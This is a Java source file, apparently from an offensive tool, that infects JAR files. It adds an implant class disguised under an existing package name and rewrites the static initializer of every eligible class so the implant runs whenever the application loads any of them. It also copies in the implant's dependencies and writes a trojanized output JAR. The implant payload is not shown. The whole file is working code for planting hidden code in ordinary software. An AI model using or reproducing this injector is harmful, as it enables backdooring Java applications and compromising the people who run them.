package org.example.injector;

import javassist.bytecode.*;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.file.Path;
import java.util.Map;
import java.util.jar.JarEntry;
import java.util.logging.Logger;
import java.util.zip.ZipException;

import static org.example.injector.Helpers.*;

public class ClassInjector {
    private final static Logger log = Logger.getLogger("ClassInjector");
    final static String IMPLANT_CLASS_NAME = "Init";
    private final ImplantHandler implantHandler;

    public ClassInjector(ImplantHandler implantHandler) {
        this.implantHandler = implantHandler;
    }

    public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
        ClassFile implantedClass = null;

        if (jarLooksSigned(targetJarFilePath)) {
            log.warning("JAR looks signed. This is not yet implemented. Aborting.");
            return false;
        }

        BufferedJarFiddler fiddler = BufferedJarFiddler.read(targetJarFilePath);
        try {
            int countClinitModified = 0;
            for (BufferedJarFiddler.BufferedJarEntry entry : fiddler) {
                if (!entry.getName().endsWith(".class")) {
                    continue;
                }
                if (entry.getName().endsWith("/" + IMPLANT_CLASS_NAME + ".class") || entry.getName().equals(IMPLANT_CLASS_NAME + ".class")) {
                    log.fine("Skipping class '" + entry.getName() + "' as it could be an already existing implant.");
                    continue;
                }

                ClassFile currentlyProcessing = readClassFile(entry.getContent());

                String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
                if (implantedClass == null) {
                    /*
                     * Since there are other classes in this directory, the implant will blend in better here.
                     * Any directory will do and only one occurrence of the implant class in the JAR is enough.
                     */
                    ClassFile implant = implantHandler.loadFreshConfiguredSpecimen();
                    deepRenameClass(implant, targetPackageName, IMPLANT_CLASS_NAME);
                    JarEntry newJarEntry = convertToJarEntry(implant);
                    try {
                        fiddler.addNewEntry(newJarEntry, asByteArray(implant));
                        log.info("Created implant class '" + newJarEntry.getName() + "'.");
                    } catch (ZipException e) {
                        log.warning("Implant class may already exists in package '" + targetPackageName + "'. Aborting.");
                        continue;   // TODO Signal these different endgames using exceptions instead
                    }

                    implantedClass = implant;
                }

                /*
                 * As the class is now planted into the JAR, it must be referred to somehow (by anything running)
                 * in order to be loaded. Modify the class initializer (static block) of all eligible classes to
                 * explicitly use the implant class. The implant will thus be called upon once per class that is
                 * infected. Remember that a class initializer will run only once per class.
                 * Several classes are infected because it's difficult to know what specific class will be used
                 * by an app.
                 */
                modifyClinit(currentlyProcessing, implantedClass);
                entry.replaceContentWith(asByteArray(currentlyProcessing));
                countClinitModified++;
                log.fine("Modified class initializer for '" + entry.getName() + "'.");
            }
            log.info("Modified the class initializer for  " + countClinitModified + " classes.");

            boolean didInfect = implantedClass != null;

            // Add any dependency classes needed for the implant
            if (didInfect) {
                int countDependencies = 0;
                for (Map.Entry<String, byte[]> dependencyEntry : implantHandler.getDependencies().entrySet()) {
                    String fileName = convertToJarEntryPathName(dependencyEntry.getKey());
                    byte[] fileContent = dependencyEntry.getValue();

                    JarEntry newJarEntry = new JarEntry(fileName);
                    try {
                        fiddler.addNewEntry(newJarEntry, fileContent);
                        countDependencies++;
                        log.fine("Added dependency file '" + fileName + "'.");
                    } catch (ZipException e) {
                        // Anyone who've debugged dependency conflicts in Java knows this is the time to just back off
                        log.severe("Dependency file '" + fileName + "' already exist. Aborting.");
                        didInfect = false;
                        break;
                    }
                }
                log.info("Added " + countDependencies + " dependencies.");
            }

            if (didInfect) {
                fiddler.write(outputJar);
                log.info("Wrote output JAR to '" + outputJar + "'.");
            } else {
                log.warning("No output JAR was written.");
            }

            return didInfect;
        } catch (Exception e) {
            throw new IOException("Something went wrong", e);
        }
    }

    static void modifyClinit(ClassFile targetClass, ClassFile implantClass) {
        MethodInfo implantInitMethod = implantClass.getMethod("init");
        if (implantInitMethod == null) {
            throw new UnsupportedOperationException("Implant class does not have a 'public static init()' function.");
        }

        MethodInfo currentClinit = targetClass.getMethod(MethodInfo.nameClinit);
        if (currentClinit == null) {
            // The target does not already have a class initializer (aka <clinit>) to merge implant code into.
            // This is fine, but to make things a bit more streamlined, create an empty one first.
            try {
                currentClinit = createAndAddClassInitializerStub(targetClass);
            } catch (DuplicateMemberException e) {
                throw new RuntimeException("Internal error: <clinit> already exist despite not existing", e);
            }
        }

        // Modify the clinit method of the target class to run the implant method (before its own code)
        Bytecode additionalClinitCode = new Bytecode(targetClass.getConstPool());
        additionalClinitCode.addInvokestatic(implantClass.getName(), implantInitMethod.getName(), implantInitMethod.getDescriptor());
        CodeAttribute additionalClinitCodeAttr = additionalClinitCode.toCodeAttribute();
        CodeAttribute currentClinitCodeAttr = currentClinit.getCodeAttribute();
        ByteBuffer concatenatedCode = ByteBuffer.allocate(additionalClinitCodeAttr.getCodeLength() + currentClinit.getCodeAttribute().getCodeLength());
        concatenatedCode.put(additionalClinitCodeAttr.getCode());
        concatenatedCode.put(currentClinitCodeAttr.getCode());
        CodeAttribute newCodeAttribute = new CodeAttribute(targetClass.getConstPool(), currentClinitCodeAttr.getMaxStack(), currentClinitCodeAttr.getMaxLocals(), concatenatedCode.array(), currentClinitCodeAttr.getExceptionTable());
        currentClinit.setCodeAttribute(newCodeAttribute);
    }

    // TODO This code is getting gnarly. Consider just stripping away debug info (for the implant class).
    static void deepRenameClass(ClassFile classFile, String newPackageName, String newClassName) {
        String newFqcn = newPackageName + "." + newClassName;
        String newSourceFileName = newClassName + ".java";

        boolean didChangeSomething = false;
        AttributeInfo sourceFileAttr = classFile.getAttribute(SourceFileAttribute.tag);
        if (sourceFileAttr != null) {
            ByteBuffer sourceFileInfo = ByteBuffer.wrap(sourceFileAttr.get());
            sourceFileInfo.order(ByteOrder.BIG_ENDIAN);
            if (sourceFileInfo.limit() != 2) {
                throw new RuntimeException("Unexpected SourceFileAttribute length: " + sourceFileInfo.limit());
            }
            int fileNameIndex = sourceFileInfo.getShort();
            String fileName = classFile.getConstPool().getUtf8Info(fileNameIndex);
            String expectedName = parseClassNameFromFqcn(classFile.getName());
            if (!fileName.startsWith(expectedName)) {
                throw new RuntimeException("Unexpected SourceFileAttribute: Expected class to start with '" + expectedName + "'.");
            }
            if (expectedName.equals(newClassName)) {
                return; // Bad flow
            }
            int newClassNameIndex = classFile.getConstPool().addUtf8Info(newSourceFileName);
            if (newClassNameIndex < 0 || newClassNameIndex > 65535) {
                throw new RuntimeException("Unexpected index in ConstPool: " + newClassNameIndex);
            }
            sourceFileInfo.flip();
            sourceFileInfo.putShort((short) newClassNameIndex);
            sourceFileAttr.set(sourceFileInfo.array());
            didChangeSomething = true;
        }

        classFile.setName(newFqcn);
        if (didChangeSomething) {
            // compact() removes any "dead" items from the ConstPool. This modifies the class byte data quite a lot.
            classFile.compact();
        }
    }
}
